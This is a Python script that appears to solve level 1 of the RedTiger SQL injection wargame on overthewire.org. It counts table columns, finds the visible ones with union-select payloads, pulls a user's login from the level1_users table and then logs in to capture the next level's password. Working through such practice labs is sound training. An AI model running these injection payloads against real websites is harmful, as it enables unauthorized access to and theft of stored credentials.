#!/usr/bin/env python3
import pickle
import tigers as tg
import tiger_cookies
from connect import my_request as req


def main():
    '''
    Simple sqli injection

    Target: Get the login for the user Hornoxe 
    Tablename: level1_users 
    '''
    table_name = 'level1_users'
    url = "https://redtiger.labs.overthewire.org/level1.php"
    finds = ['username', 'password']  # What we are finding
    pass_r = 'The password for the next level is: '
    level = 'level1login'

    # Counting the number of columns
    columns = tg.count_columns(url, '1 order by %s', 'cat')

    list_of_columns = [str(c + 1) * 3 for c in range(columns)]
    print('list of columns: ', list_of_columns)

    # Search for visible columns
    payload = dict(
        cat=f"-1 union select {','.join(list_of_columns)} from {table_name}")
    list_of_visible, html_visible = tg.find_visible_columns(
        url, list_of_columns, payload)

    # Search for the desired data
    keys = []
    for field in finds:
        list_of_columns[int(list_of_visible[0][0]) - 1] = field
        payload = dict(
            cat=f"-1 union select {','.join(list_of_columns)} from {table_name}")
        keys.append(tg.find_param(url, html_visible, payload))

    # Authorization
    data = dict(user=keys[0], password=keys[1], login='Login')
    response = req.post_request(url, data)

    # Еxtracting data from html
    passw = tg.extract_pass(response, pass_r).replace(pass_r, '')
    print('password:', passw)

    # Save cookie
    try:
        with open('cooks.pickle', 'rb') as f:
            cooks = pickle.load(f)
    except:
        cooks = dict(level2login=passw)

    tiger_cookies.save_cookies(cooks, level, passw)


if __name__ == '__main__':
    main()
